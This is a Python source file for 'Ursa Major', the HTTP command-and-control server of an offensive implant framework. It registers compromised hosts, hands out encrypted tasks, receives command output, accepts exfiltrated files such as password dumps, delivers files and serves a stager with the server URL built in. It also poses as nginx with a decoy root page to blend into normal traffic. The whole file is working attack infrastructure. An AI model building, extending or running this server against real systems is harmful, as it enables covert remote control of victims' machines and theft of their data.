#!/usr/bin/env python3
"""
Ursa Major — C2 HTTP Server
==============================
The always-running daemon that implants beacon back to.

Endpoints:
    POST /register     — New implant registers, gets session ID + key
    POST /beacon       — Implant checks in, gets pending tasks
    POST /result       — Implant returns task results
    POST /upload       — Implant uploads a file (exfil)
    GET  /download/<id> — Implant downloads a file (delivery)
    GET  /stage        — Serve a stager payload

All comms are encrypted with per-session AES keys after registration.
HTTP looks like normal web traffic (JSON API responses).

Run:
    python3 major/server.py [--port 8443] [--host 0.0.0.0]
"""

import argparse
import base64
import json
import os
import sys
import threading
import time
from datetime import UTC, datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

# Add parent to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from implants.builder import Builder as _PayloadBuilder
from major.config import get_config, reload_config
from major.crypto import UrsaCrypto, generate_session_key
from major.db import (
    complete_task,
    create_session,
    get_file,
    get_pending_tasks,
    get_session,
    get_task,
    init_db,
    list_sessions,
    log_event,
    store_file,
    update_session_checkin,
    update_session_info,
)

# ── Configuration (loaded from ursa.yaml with defaults) ──

_cfg = get_config()
DEFAULT_PORT = _cfg.get("major.port", 8443)
DEFAULT_HOST = _cfg.get("major.host", "0.0.0.0")
STALE_THRESHOLD = _cfg.get("major.stale_threshold", 300)
SERVER_HEADER = _cfg.get("major.server_header", "nginx/1.24.0")
REAPER_INTERVAL = _cfg.get("major.reaper_interval", 30)


class UrsaC2Handler(BaseHTTPRequestHandler):
    """HTTP request handler for C2 communications."""

    # Suppress default logging — we log our own way
    def log_message(self, format, *args):
        pass

    def _send_json(self, data, status=200):
        """Send a JSON response."""
        body = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        # Disguise as a generic web API
        self.send_header("Server", SERVER_HEADER)
        self.send_header("X-Request-Id", os.urandom(8).hex())
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self):
        """Read request body as JSON."""
        length = int(self.headers.get("Content-Length", 0))
        if length == 0:
            return {}
        raw = self.rfile.read(length)
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            return {"raw": raw.decode("utf-8", errors="replace")}

    def _get_client_ip(self):
        """Get the real client IP (respects X-Forwarded-For)."""
        forwarded = self.headers.get("X-Forwarded-For")
        if forwarded:
            return forwarded.split(",")[0].strip()
        return self.client_address[0]

    # ── Routes ──

    def do_GET(self):
        path = urlparse(self.path).path

        if path == "/":
            # Decoy — looks like a normal website
            self._send_json({
                "status": "ok",
                "version": "1.0",
                "timestamp": datetime.now(UTC).isoformat()
            })

        elif path.startswith("/download/"):
            file_id = path.split("/")[-1]
            self._handle_download(file_id)

        elif path == "/stage":
            self._handle_stage()

        elif path == "/health":
            self._send_json({"status": "healthy"})

        else:
            # Return 404 for unknown paths (like a real server)
            self._send_json({"error": "not found"}, 404)

    def do_POST(self):
        path = urlparse(self.path).path
        body = self._read_body()

        if path == "/register":
            self._handle_register(body)
        elif path == "/beacon":
            self._handle_beacon(body)
        elif path == "/result":
            self._handle_result(body)
        elif path == "/upload":
            self._handle_upload(body)
        else:
            self._send_json({"error": "not found"}, 404)

    # ── Handlers ──

    def _handle_register(self, body):
        """New implant registering with the C2.

        Expected body:
            {
                "hostname": "WORKSTATION1",
                "username": "admin",
                "os": "Windows 10",
                "arch": "x64",
                "pid": 1234,
                "process": "svchost.exe"
            }
        """
        client_ip = self._get_client_ip()
        session_key = generate_session_key()

        session_id = create_session(
            remote_ip=client_ip,
            hostname=body.get("hostname", "unknown"),
            username=body.get("username", "unknown"),
            os_info=body.get("os", "unknown"),
            arch=body.get("arch", "unknown"),
            pid=body.get("pid", 0),
            process_name=body.get("process", "unknown"),
            campaign=body.get("campaign", ""),
            tags=body.get("tags", ""),
            encryption_key=session_key,
            beacon_interval=body.get("interval", 5),
            jitter=body.get("jitter", 0.1),
        )

        _log(f"[+] New session: {session_id} — {body.get('username', '?')}@{body.get('hostname', '?')} ({client_ip})")

        self._send_json({
            "session_id": session_id,
            "key": session_key,
            "interval": body.get("interval", 5),
            "jitter": body.get("jitter", 0.1),
        })

    def _handle_beacon(self, body):
        """Implant checking in for tasks.

        Expected body:
            {
                "session_id": "abc12345",
                "data": "<encrypted beacon data or empty>"
            }
        """
        session_id = body.get("session_id")
        if not session_id:
            self._send_json({"error": "missing session_id"}, 400)
            return

        session = get_session(session_id)
        if not session:
            self._send_json({"error": "unknown session"}, 404)
            return

        # Update last seen
        client_ip = self._get_client_ip()
        update_session_checkin(session_id, client_ip)

        # Get pending tasks
        pending = get_pending_tasks(session_id)

        tasks_out = []
        for task in pending:
            tasks_out.append({
                "id": task["id"],
                "type": task["task_type"],
                "args": json.loads(task["args"]) if isinstance(task["args"], str) else task["args"],
            })

        # If we have the session key, encrypt the response
        if session.get("encryption_key") and body.get("encrypted"):
            crypto = UrsaCrypto(session["encryption_key"])
            encrypted_tasks = crypto.encrypt_json({"tasks": tasks_out})
            self._send_json({"data": encrypted_tasks})
        else:
            self._send_json({"tasks": tasks_out})

    def _handle_result(self, body):
        """Implant returning task results.

        Expected body:
            {
                "session_id": "abc12345",
                "task_id": "def67890",
                "result": "command output...",
                "error": ""
            }
        """
        session_id = body.get("session_id")
        task_id = body.get("task_id")

        if not session_id or not task_id:
            self._send_json({"error": "missing fields"}, 400)
            return

        session = get_session(session_id)
        if not session:
            self._send_json({"error": "unknown session"}, 404)
            return

        # Handle encrypted results
        result_data = body.get("result", "")
        error_data = body.get("error", "")

        if body.get("encrypted") and session.get("encryption_key"):
            try:
                crypto = UrsaCrypto(session["encryption_key"])
                decrypted = crypto.decrypt_json(body["data"])
                result_data = decrypted.get("result", "")
                error_data = decrypted.get("error", "")
            except Exception as e:
                error_data = f"Decryption failed: {e}"

        complete_task(task_id, result=result_data, error=error_data)
        update_session_checkin(session_id)

        task = get_task(task_id)
        if task:
            status = "ERROR" if error_data else "OK"
            _log(f"    [{status}] Task {task_id} ({task['task_type']}) — session {session_id}")

        self._send_json({"status": "ok"})

    def _handle_upload(self, body):
        """Implant uploading a file (exfiltration).

        Expected body:
            {
                "session_id": "abc12345",
                "filename": "passwords.txt",
                "data": "<base64 encoded file data>"
            }
        """
        session_id = body.get("session_id")
        if not session_id or not get_session(session_id):
            self._send_json({"error": "invalid session"}, 400)
            return

        filename = body.get("filename", "unknown")
        file_data = base64.b64decode(body.get("data", ""))

        file_id = store_file(session_id, filename, file_data, direction="download")
        _log(f"    [FILE] Received {filename} ({len(file_data)}B) from session {session_id}")

        self._send_json({"status": "ok", "file_id": file_id})

    def _handle_download(self, file_id):
        """Serve a file for implant to download."""
        f = get_file(file_id)
        if not f:
            self._send_json({"error": "file not found"}, 404)
            return

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(f["data"])))
        self.end_headers()
        self.wfile.write(f["data"])

    def _handle_stage(self):
        """Serve a stager payload with the C2 URL baked in.

        Uses the payload builder to substitute URSA_C2_URL in stager.py so
        the served stager already knows where to phone home.  Falls back to
        the raw stager.py (token un-substituted) if the builder fails.
        """
        host, port = self.server.server_address
        cfg = get_config()
        public_url = cfg.get("major.public_url", "")
        if not public_url:
            # Derive from bind address; replace 0.0.0.0 with loopback as fallback
            effective_host = host if host not in ("0.0.0.0", "") else "127.0.0.1"
            public_url = f"http://{effective_host}:{port}"

        try:
            source = _PayloadBuilder().build_stager(public_url)
            payload = source.encode()
        except FileNotFoundError:
            # No stager.py present at all
            self._send_json({"error": "no stager configured"}, 404)
            return
        except Exception as exc:
            _log(f"[!] Stager build error: {exc}")
            self._send_json({"error": "stager build failed"}, 500)
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)


# ── Session Reaper ──


def _session_reaper():
    """Background thread that marks stale sessions."""
    while True:
        try:
            sessions = list_sessions(status="active")
            now = time.time()
            for s in sessions:
                # If no beacon in 5x the interval, mark stale
                threshold = max(STALE_THRESHOLD, s.get("beacon_interval", 5) * 5)
                if now - s["last_seen"] > threshold:
                    update_session_info(s["id"], status="stale")
                    _log(f"[!] Session {s['id']} marked stale (no beacon for {int(now - s['last_seen'])}s)")
        except Exception:
            pass
        time.sleep(REAPER_INTERVAL)


# ── Logging ──


def _log(msg):
    """Print timestamped log message."""
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


# ── Main ──


def start_server(host=DEFAULT_HOST, port=DEFAULT_PORT):
    """Start the Ursa Major C2 server."""
    init_db()

    # Start reaper thread
    reaper = threading.Thread(target=_session_reaper, daemon=True)
    reaper.start()

    server = HTTPServer((host, port), UrsaC2Handler)

    _log("=" * 55)
    _log("  URSA MAJOR — Command & Control Server")
    _log("=" * 55)
    _log(f"  Listening: {host}:{port}")
    _log("  Protocol:  HTTP")
    _log(f"  Database:  {os.path.abspath(os.path.join(os.path.dirname(__file__), 'ursa.db'))}")
    _log("")
    _log("  Endpoints:")
    _log("    POST /register  — Implant registration")
    _log("    POST /beacon    — Implant check-in")
    _log("    POST /result    — Task results")
    _log("    POST /upload    — File exfiltration")
    _log("    GET  /download  — File delivery")
    _log("    GET  /stage     — Serve stager")
    _log("=" * 55)
    _log("  Waiting for connections...")
    _log("")

    log_event("info", "server", f"Ursa Major C2 started on {host}:{port}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        _log("\n[*] Shutting down...")
        server.shutdown()
        log_event("info", "server", "Ursa Major C2 stopped")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ursa Major C2 Server")
    parser.add_argument("--host", default=None, help="Bind address")
    parser.add_argument("--port", type=int, default=None, help="Bind port")
    parser.add_argument("--profile", default=None, help="Config profile to use")
    parser.add_argument("--config", default=None, help="Path to config file")
    args = parser.parse_args()

    # Reload config with profile/path if specified
    if args.profile or args.config:
        cfg = reload_config(path=args.config, profile=args.profile)
    else:
        cfg = get_config()

    host = args.host or cfg.get("major.host", DEFAULT_HOST)
    port = args.port or cfg.get("major.port", DEFAULT_PORT)
    start_server(host, port)
